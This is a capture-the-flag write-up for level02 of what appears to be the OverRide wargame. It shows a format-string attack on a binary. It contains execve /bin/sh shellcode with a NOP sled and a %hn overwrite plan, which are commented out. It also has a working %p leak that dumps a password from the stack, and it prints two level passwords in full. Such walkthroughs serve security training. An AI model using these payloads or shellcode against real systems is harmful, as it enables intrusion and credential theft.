# Level 02
*password : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv*

## Analyze

```
scp -P 4242 level02@192.168.56.109:level02 binary/
```

## printf exploit ?

<!-- use printf to overwrite the return of `puts()` with our shellcode ?

shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
```
$ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```
```
$ scp -P 4242 level02/Ressources/getenv.c  level02@192.168.56.109:/tmp/
```
```
$ cd /tmp
$ gcc getenv.c
$ cd -
/home/users/level02
$ level02@OverRide:~$ /tmp/a.out

0x7fffffffe822
```
- 7FFFFF : 8388607
- FFE822 : 16771106
16771106 - 8388603
8382495

puts() address : 0x0000000000200b5a
python -c 'print "\x5a\x0b\x20" %8388604x %hn %8382496x %hn"' -->

offset = 22\
40 / 8 = 5
```
level02@OverRide:~$ python -c 'print " %22$p %23$p %24$p %25$p %26$p"' > /tmp/level02 ; cat /tmp/level02 | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
level02@OverRide:~$ 
```

0x756e505234376848 => 4868373452506e75 = Hh74RPnu\
0x45414a3561733951 => 51397361354a4145 = Q9sa5JAE\
0x377a7143574e6758 => 58674e5743717a37 = XgNWCqz7\
0x354a35686e475873 => 7358476e68354a35 = sXGnh5J5\
0x48336750664b394d => 4d394b6650673348 = M9KfPg3H

password: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
